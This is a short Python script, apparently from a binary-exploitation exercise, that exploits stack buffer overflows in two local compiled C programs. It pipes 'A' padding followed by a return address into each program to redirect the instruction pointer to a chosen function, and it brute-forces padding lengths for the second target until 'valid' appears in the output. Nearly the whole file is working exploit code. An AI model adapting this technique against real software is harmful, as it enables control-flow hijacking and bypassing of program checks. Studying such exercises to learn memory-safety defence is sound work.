#!/usr/bin/env python3
from subprocess import Popen, PIPE, STDOUT

def exploit(program_name, padding_length, shellcode):
    """
        This program executes the passed in program and pipes a payload
        into the STDIN of the program. This payload is created by
        concatenating padding and the passed in shellcode together.

        Args:
            program_name (string): The name of the C program you want to execute/exploit
            padding_length (int): The number of padding bytes you want to try
            shellcode (bytes string): The exploit you want to run on success

        Returns:
            Returns the STDOUT of the program you are trying to execute/exploit
    """
    # The full string to be pipped into our target program
    PAYLOAD = (b'A' * padding_length) + shellcode

    # Execute our compiled C program, pipe all three file descriptors so we can interact
    p = Popen(['./'+program_name], stdout=PIPE, stdin=PIPE, stderr=PIPE)
    # This pipes PAYLOAD into the program and gets the STDOUT. Communicate returns a tuple
    # with the first element being the stdout and second element being the stderr.
    stdout_bytes = p.communicate(PAYLOAD)[0]
    # Below command is the same as iterating through all the stdout_bytes and converting
    # them into characters, just makes it easier to see our output
    stdout_decoded = "".join(map(chr, stdout_bytes))
    return stdout_decoded


if __name__ == "__main__":
    PROGRAM_NAME = "overflow.out"
    # The code we want the Instruction Pointer to execute (return_input function)
    SHELLCODE = b"\x5f\x84\x04\x08"
    # The amount of padding needed for SHELLCODE to be loaded into the Instruction Pointer
    PADDING_LENGTH = 34
    print("\n{} output:".format(PROGRAM_NAME))
    print(exploit(PROGRAM_NAME, PADDING_LENGTH, SHELLCODE))

    PROGRAM_NAME = "serial.out"
    # The code we want the Instruction Pointer to execute (do_valid_stuff function)
    SHELLCODE = b"\x01\x86\x04\x08"
    # Try multiple padding values to see if we can place our shellcode in the right place
    for padding_len in range(24, 30):
        output = exploit(PROGRAM_NAME, padding_len, SHELLCODE)
        if("valid" in output):
            print("Correct padding length for {} is {}".format(PROGRAM_NAME, padding_len))
            print("{} output:\n{}".format(PROGRAM_NAME, output))

